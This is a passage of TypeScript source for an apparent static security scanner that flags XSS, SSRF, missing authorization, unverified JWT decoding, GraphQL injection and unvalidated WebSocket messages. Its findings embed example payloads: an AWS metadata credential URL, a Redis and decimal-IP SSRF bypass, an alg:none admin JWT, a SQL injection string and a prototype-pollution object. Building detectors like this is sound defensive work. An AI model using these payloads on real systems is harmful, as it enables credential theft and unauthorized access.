    'attribute':  `Use encodeURIComponent(${interp}) or setAttribute with textContent`,
    'js-string':  `Never interpolate untrusted data into JS strings — use JSON.stringify or store in data attributes`,
    'inline-js':  `Remove eval/dynamic code execution — redesign with data attributes + event listeners`,
    'css':        `Validate CSS values against a strict allowlist before interpolation`,
    'url':        `Use encodeURIComponent(${interp}) and validate URL scheme (reject javascript:)`,
    'dom-sink':   `element.textContent = ${interp}  // safe for text; DOMPurify.sanitize() for HTML`,
    'jsx':        `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(${interp}, {ALLOWED_TAGS: []}) }} />`,
  };

  return {
    id:            `xss-ctx-${ctx}-${ln}`,
    title:         `XSS (${ctxLabel[ctx]}) — unsanitized tainted value`,
    explanation:   `Variable '${interp}' (from ${tv?.source ?? 'external input'} at L${tv?.line ?? '?'}) flows into ${ctxLabel[ctx]} context without context-appropriate encoding. This is a ${ctx === 'inline-js' ? 'critical RCE-equivalent' : 'high'} XSS vector.`,
    exploitChain:  `${tv?.source ?? 'user input'} → L${tv?.line ?? '?'} → ${interp} → L${ln} ${ctxLabel[ctx]} sink → browser executes attacker JS`,
    exploitPayload: contextXssPayload(ctx),
    fix:           fixMap[ctx],
    severity:      ctx === 'inline-js' ? 'high' : 'high',
    category:      'security',
    line:          ln,
    confidence:    85,
    exploitability: ctx === 'inline-js' ? 95 : 90,
    reachability:  90,
    blastRadius:   'high',
    trustBoundary: { source: `${interp} (untrusted external input)`, sanitizer: null, bypass: null, sink: `${ctxLabel[ctx]} sink (L${ln})` },
    attackChain: {
      entry: tv?.source ?? 'HTTP request',
      hops: [`L${tv?.line ?? '?'}: assigned to ${interp}`, `L${ln}: interpolated into ${ctxLabel[ctx]}`],
      sink: `Browser XSS via ${ctxLabel[ctx]}`,
      impact: 'Session hijack, credential theft, CSRF bypass',
    },
  };
}

// ─── Stage 7: SSRF Containment ────────────────────────────────────────────────
function analyzeSsrf(lines: LineInfo[], tainted: Map<string, TaintVar>, deadLines = new Set<number>()): PipelineFinding[] {
  const findings: PipelineFinding[] = [];

  for (const { index, raw } of lines) {
    const ln = index + 1;
    if (deadLines.has(ln)) continue;

    // Direct user URL in fetch/axios/got/request
    const fetchM = raw.match(/(?:fetch|axios(?:\.get|\.post)?|got|request)\s*\(\s*(\w+)/);
    if (fetchM) {
      const urlVar = fetchM[1];
      if (tainted.has(urlVar)) {
        const nearby = lines.slice(Math.max(0, index - 5), index + 2).map(l => l.raw).join('\n');
        if (REDIRECT_SAFE.test(nearby)) continue;

        // Check for decimal/octal IP normalization bypass risk
        const extraNote = `DNS rebinding, decimal IPs (2130706433 = 127.0.0.1), octal IPs (0177.0.0.1), and IPv6 (::1) all bypass URL-based blocklists.`;

        findings.push({
          id:            `ssrf-fetch-${ln}`,
          title:         'SSRF — user-controlled URL in fetch without allowlist',
          explanation:   `Variable '${urlVar}' (from ${tainted.get(urlVar)?.source ?? 'external input'}) is passed to fetch()/HTTP client without domain validation. ${extraNote}`,
          exploitChain:  `user input → ${urlVar} → fetch(${urlVar}) → server makes request to attacker-specified host`,
          exploitPayload: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role\n→ AWS metadata: leaks IAM credentials\nurl=http://localhost:6379/\n→ Redis RESP injection: unauthenticated command execution\nurl=http://2130706433/ (decimal 127.0.0.1)\n→ bypasses "127.0.0.1" blocklist check`,
          fix:           null,
          fixRejectionReason: 'URL string validation cannot prevent SSRF. Blocklists are bypassed by DNS rebinding, decimal IPs, octal IPs, IPv6, and URL encoding. Implement an outbound allowlist at the network layer (egress firewall or proxy with explicit allowlist).',
          severity:      'high',
          category:      'security',
          line:          ln,
          confidence:    90,
          exploitability: 85,
          reachability:  95,
          blastRadius:   'critical',
          trustBoundary: { source: `${urlVar} (untrusted)`, sanitizer: null, bypass: 'DNS rebinding / IP normalization bypass', sink: `fetch() (network egress)` },
          attackChain: {
            entry: 'HTTP request with attacker-controlled URL',
            hops: [`L${tainted.get(urlVar)?.line ?? '?'}: ${urlVar} assigned`, `L${ln}: passed to fetch()`],
            sink: 'Internal network / cloud metadata service',
            impact: 'Cloud credential theft, internal service access, data exfiltration',
          },
        });
      }
    }

    // Template literal URL in fetch
    const tmplFetchM = raw.match(/(?:fetch|axios)\s*\(`[^`]*\$\{(\w+)\}`\)/);
    if (tmplFetchM && tainted.has(tmplFetchM[1])) {
      const nearby = lines.slice(Math.max(0, index - 5), index + 2).map(l => l.raw).join('\n');
      if (!REDIRECT_SAFE.test(nearby)) {
        findings.push({
          id:            `ssrf-tmpl-${ln}`,
          title:         'SSRF — tainted variable in template URL for HTTP request',
          explanation:   `User-controlled '${tmplFetchM[1]}' is interpolated into the URL passed to fetch(). Attacker controls the path or subdomain.`,
          exploitChain:  `${tmplFetchM[1]} → fetch(\`...${tmplFetchM[1]}...\`) → internal host access`,
          exploitPayload: `${tmplFetchM[1]} = "@internal-host/admin" or "/../../../admin"`,
          fix:           null,
          fixRejectionReason: 'Allowlist permitted URL prefixes at the network layer.',
          severity:      'high',
          category:      'security',
          line:          ln,
          confidence:    80,
          exploitability: 75,
          reachability:  85,
          blastRadius:   'high',
          trustBoundary: { source: `${tmplFetchM[1]} (untrusted)`, sanitizer: null, bypass: null, sink: 'HTTP client' },
          attackChain: { entry: 'user input', hops: [`L${ln}: interpolated into URL`], sink: 'Network request', impact: 'SSRF → internal service access' },
        });
      }
    }
  }

  return findings;
}

// ─── Stage 8: Framework-Specific Analysis ────────────────────────────────────
function analyzeFramework(lines: LineInfo[], tainted: Map<string, TaintVar>, ctx: FrameworkContext, deadLines = new Set<number>(), projectIndex?: ProjectIndex): PipelineFinding[] {
  const findings: PipelineFinding[] = [];

  for (const route of projectIndex?.routes ?? []) {
    if (!route.sensitive || route.authGuard || deadLines.has(route.line)) continue;
    findings.push({
      id: `framework-missing-auth-${route.file}-${route.line}`,
      title: 'CWE-862 Missing Authorization - sensitive framework route lacks auth guard',
      explanation: `${route.framework} route ${route.method} ${route.path} is sensitive and no route decorator, dependency, or nearby authorization guard was found in the framework lifecycle window.`,
      exploitChain: `anonymous request -> ${route.method} ${route.path} -> ${route.handler} without auth guard`,
      exploitPayload: `curl ${route.path}`,
      fix: 'Add framework-native authentication/authorization at the decorator, dependency, middleware, or route handler boundary and enforce object-level permissions before privileged work.',
      severity: 'high',
      category: 'security',
      line: route.line,
      confidence: 82,
      exploitability: 78,
      reachability: 92,
      blastRadius: route.path.includes('admin') || route.path.includes('config') ? 'high' : 'medium',
      framework: route.framework,
      cwe: 'CWE-862',
      cweName: 'Missing Authorization',
      trustBoundary: { source: 'anonymous HTTP request', sanitizer: null, bypass: null, sink: `${route.framework} ${route.path}` },
      attackChain: { entry: 'HTTP request', hops: [`L${route.line}: route registered`, 'no auth guard in lifecycle window'], sink: route.handler, impact: 'Unauthorized access to sensitive operation or data' },
    });
  }

  for (const { index, raw } of lines) {
    const ln = index + 1;
    if (deadLines.has(ln)) continue;

    // Next.js server actions: 'use server' + untrusted param
    if (ctx.serverActions && /export\s+async\s+function/.test(raw)) {
      // Look ahead for direct use of params
      const body = lines.slice(index, index + 20).map(l => l.raw).join('\n');
      if ([...tainted.keys()].some(v => body.includes(v))) {
        // Only report if there's an actual sink
        if (/db\.|query|exec|innerHTML|fetch/.test(body)) {
          findings.push({
            id: `nextjs-server-action-${ln}`,
            title: 'Next.js Server Action — untrusted input reaches privileged sink',
            explanation: `This server action (marked 'use server') processes tainted input that flows to a privileged sink. Server Actions run with server privileges and can access DB/internal APIs directly.`,
            exploitChain: `Client form submission → server action → tainted param → privileged sink`,
            exploitPayload: `Craft request to directly invoke server action endpoint with malicious payload`,
            fix: 'Validate and sanitize all server action parameters with Zod or similar schema validation before use.',
            severity: 'high',
            category: 'security',
            line: ln,
            confidence: 70,
            exploitability: 75,
            reachability: 80,
            blastRadius: 'high',
            framework: 'Next.js',
            trustBoundary: { source: 'Client form data (untrusted)', sanitizer: null, bypass: null, sink: 'Server Action (privileged)' },
            attackChain: { entry: 'Client form', hops: ['Server action invocation'], sink: 'Privileged server-side operation', impact: 'Data manipulation, privilege escalation' },
          });
        }
      }
    }

    // JWT decode used for auth decisions
    if (/jwt\.decode\s*\(/.test(raw)) {
      const nearby = lines.slice(index, index + 5).map(l => l.raw).join('\n');
      if (/user\.|role|admin|auth|permission/i.test(nearby)) {
        findings.push({
          id: `jwt-decode-auth-${ln}`,
          title: 'JWT — jwt.decode() used for auth decisions (skips signature verification)',
          explanation: `jwt.decode() only base64-decodes the token payload — it does NOT verify the signature. An attacker crafts any payload (e.g., {role:"admin"}) and it passes without verification.`,
          exploitChain: `attacker crafts JWT with arbitrary claims → jwt.decode() accepts it → auth check passes → privilege escalation`,
          exploitPayload: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiIxIiwicm9sZSI6ImFkbWluIn0.\n// Algorithm "none" — no signature required. jwt.decode() accepts this.`,
          fix: `jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] })\n// Never use jwt.decode() for authentication — always jwt.verify() with pinned algorithm`,
          severity: 'high',
          category: 'security',
          line: ln,
          confidence: 95,
          exploitability: 90,
          reachability: 85,
          blastRadius: 'critical',
          framework: 'JWT',
          trustBoundary: { source: 'JWT token (untrusted — not verified)', sanitizer: null, bypass: 'alg:none bypass', sink: 'Auth/authorization decision' },
          attackChain: { entry: 'Attacker-crafted JWT', hops: ['jwt.decode() skips verification', 'Payload accepted as trusted'], sink: 'Privilege escalation / unauthorized access', impact: 'Full auth bypass, admin takeover' },
        });
      }
    }

    // GraphQL resolver with direct DB query on unvalidated args
    if (ctx.graphql && /resolve[r]?\s*[\(:,]/.test(raw)) {
      const body = lines.slice(index, index + 15).map(l => l.raw).join('\n');
      if (/args\.\w+/.test(body) && (/db\.|query\(/.test(body)) && !SQL_PARAMETERIZED.test(body)) {
        findings.push({
          id: `graphql-resolver-sqli-${ln}`,
          title: 'GraphQL Resolver — unvalidated args flow to database query',
          explanation: 'GraphQL resolver uses args directly in a database call without parameterization. Attackers craft malicious GraphQL queries to inject into the SQL/NoSQL backend.',
          exploitChain: 'GraphQL query with malicious arg → resolver → db.query(rawArg) → SQL/NoSQL injection',
          exploitPayload: '{ user(id: "1 OR 1=1--") { email password } }',
          fix: 'Validate all resolver args with a schema (Zod/Joi). Use parameterized queries or ORM methods.',
          severity: 'high',
          category: 'security',
          line: ln,
          confidence: 75,
          exploitability: 80,
          reachability: 85,
          blastRadius: 'high',
          framework: 'GraphQL',
          trustBoundary: { source: 'GraphQL args (untrusted)', sanitizer: null, bypass: null, sink: 'Database query' },
          attackChain: { entry: 'GraphQL query', hops: ['resolver args', 'db.query()'], sink: 'Database', impact: 'Data exfiltration, auth bypass' },
        });
      }
    }

    // WebSocket message handling without validation
    if (ctx.hasWebSocket && /(?:socket|ws)\.on\s*\(\s*['"]message['"]/.test(raw)) {
      const body = lines.slice(index, index + 10).map(l => l.raw).join('\n');
      if (/JSON\.parse/.test(body) || /data\./.test(body)) {
        if (!/zod|joi|yup|validate|schema/i.test(body)) {
          findings.push({
            id: `websocket-unvalidated-${ln}`,
            title: 'WebSocket — message data used without schema validation',
            explanation: 'WebSocket messages are processed without schema validation. Attacker sends crafted messages to trigger injection, DoS, or prototype pollution.',
            exploitChain: 'Attacker sends WebSocket message → no validation → message data used directly → injection/pollution',
            exploitPayload: '{"__proto__":{"isAdmin":true}} → prototype pollution\nor {"query":"malicious SQL"}',
            fix: 'Validate all WebSocket message data with Zod/Joi before processing.',
            severity: 'medium',
            category: 'security',
            line: ln,
            confidence: 70,
            exploitability: 65,
            reachability: 75,
            blastRadius: 'medium',
            framework: 'WebSocket',
            trustBoundary: { source: 'WebSocket message (untrusted)', sanitizer: null, bypass: null, sink: 'Application logic' },
            attackChain: { entry: 'WebSocket client', hops: ['on("message")', 'JSON.parse'], sink: 'Application processing', impact: 'Injection, prototype pollution, DoS' },
          });
        }
      }
    }
  }

  return findings;
}

// ─── Stage 9: Confidence Engine ───────────────────────────────────────────────
function scoreFindings(findings: PipelineFinding[]): PipelineFinding[] {
  return findings.map(f => {
    // Adjust confidence based on hop count, sanitizer presence, etc.
    let conf = f.confidence;
    let exploitability = f.exploitability;
    let reachability = f.reachability;
    let blastRadius = f.blastRadius;

    // High-confidence patterns
    if (f.id.startsWith('ssrf')) conf = Math.min(conf + 5, 95);
    if (f.id.startsWith('jwt-decode')) conf = Math.min(conf + 5, 98);
    if (f.cwe === 'CWE-78' || /OS Command Injection|OS command|shell=True|os\.system|subprocess/i.test(f.title + f.explanation + f.exploitChain)) {
      exploitability = Math.max(exploitability, 92);
      blastRadius = 'critical';
    }
    if (f.cwe === 'CWE-88') {
      exploitability = Math.min(exploitability, 58);
      blastRadius = blastRadius === 'critical' ? 'high' : blastRadius;
    }
    if (f.cwe === 'CWE-862') {
      reachability = Math.max(reachability, 90);
      exploitability = Math.max(exploitability, 76);
    }
    if (f.cwe === 'CWE-601') {
      exploitability = Math.min(Math.max(exploitability, 60), 72);
      blastRadius = blastRadius === 'critical' ? 'medium' : blastRadius;
    }

    // Compute risk score: combine exploitability + reachability + blast radius
    const blastMult = { critical: 1.0, high: 0.85, medium: 0.65, low: 0.45 }[blastRadius];
    const riskScore = Math.round((exploitability * 0.4 + reachability * 0.4 + conf * 0.2) * blastMult);
    const inferredSink: SinkKind =
      /sql/i.test(f.title) ? 'sql' :
      /xss|html|dom/i.test(f.title) ? 'xss' :
      /command|exec|shell/i.test(f.title) ? 'cmd' :
      /path|file/i.test(f.title) ? 'path' :
      /redirect/i.test(f.title) ? 'redirect' :
      /ssrf|fetch|request/i.test(f.title) ? 'ssrf' :
      /deserial|pickle|yaml/i.test(f.title) ? 'deserialization' :
      /template|ssti/i.test(f.title) ? 'ssti' :
      /header/i.test(f.title) ? 'header' : 'xss';
    const cwe = f.cwe ? { id: f.cwe, name: f.cweName ?? f.cwe } : CWE_BY_SINK[inferredSink];

    return { ...f, confidence: conf, exploitability, reachability, blastRadius, riskScore, cwe: cwe.id, cweName: cwe.name };
  });
}

// ─── Main Pipeline Entry Point ────────────────────────────────────────────────
export function runPipeline(code: string): PipelineReport {
  const lineInfos      = parseLines(code);
  const callGraph      = buildCallGraph(lineInfos);
  const cfg            = buildControlFlowGraph(lineInfos, callGraph);
  const ssa            = buildSSA(lineInfos);
  const projectIndex   = buildProjectIndex(lineInfos, callGraph);
  const frameworkCtx   = detectFramework(code);
  const constants      = buildConstantFacts(lineInfos);
  const deadLines      = buildDeadLines(lineInfos, constants);
  const constructorFields = buildConstructorFieldSummaries(lineInfos);
  const taintedVars    = runInterproceduralTaint(lineInfos, callGraph, ssa, frameworkCtx, constants, deadLines, constructorFields);
  const pathFacts      = buildPathFacts(lineInfos);
  const trustBoundaries = buildTrustBoundaries(code);
  const language       = detectLanguageLocal(code);

  const taintSinkFindings = analyzeTaintSinks(lineInfos, taintedVars, ssa, pathFacts, language, frameworkCtx, deadLines);
  const xssFindings      = analyzeContextualXss(lineInfos, taintedVars, deadLines);
  const ssrfFindings     = analyzeSsrf(lineInfos, taintedVars, deadLines);
  const frameworkFindings = analyzeFramework(lineInfos, taintedVars, frameworkCtx, deadLines, projectIndex);

  const allFindings = scoreFindings([...taintSinkFindings, ...xssFindings, ...ssrfFindings, ...frameworkFindings]);

  // Deduplicate by line + type
  const seen  = new Set<string>();
  const deduped = allFindings.filter(f => {
    const k = `${f.line}:${f.title.slice(0, 40)}`;
    if (seen.has(k)) return false;
    seen.add(k);
    return true;
  });

  // Build summary
  const parts: string[] = [];
  if (taintedVars.size) parts.push(`${taintedVars.size} taint sources`);
  if (cfg.nodes.length) parts.push(`${cfg.nodes.length} CFG nodes`);
  if (ssa.versions.size) parts.push(`${ssa.versions.size} SSA vars`);
  if (taintSinkFindings.length) parts.push(`${taintSinkFindings.length} exploitability-scored flows`);
  if (xssFindings.length) parts.push(`${xssFindings.length} XSS (context-aware)`);
  if (ssrfFindings.length) parts.push(`${ssrfFindings.length} SSRF`);
  if (frameworkFindings.length) parts.push(`${frameworkFindings.length} framework-specific`);
  if (frameworkCtx.detected.length) parts.push(`frameworks: ${frameworkCtx.detected.join(', ')}`);
  if (projectIndex.crossFileEdges.length) parts.push(`${projectIndex.crossFileEdges.length} cross-file calls`);
  if (projectIndex.routes.length) parts.push(`${projectIndex.routes.length} routes indexed`);
  if (deadLines.size) parts.push(`${deadLines.size} dead lines suppressed`);

  const files = [...new Set(lineInfos.map(l => l.file))];
  const precision: PrecisionMetadata = {
    files,
    objectFields: [...taintedVars.keys()].filter(v => v.includes('.')).length,
    constants: constants.size,
    deadLines: deadLines.size,
    feasibleBranches: pathFacts.length,
    crossFileEdges: projectIndex.crossFileEdges.length,
    routes: projectIndex.routes.length,
  };

  return {
    findings:         deduped,
    callGraph,
    cfg,
    ssa,
    projectIndex,
    taintedVars,
    trustBoundaries,
    frameworkContext: frameworkCtx,
    precision,
    summary:          parts.join(' | ') || 'no pipeline findings',
  };
}
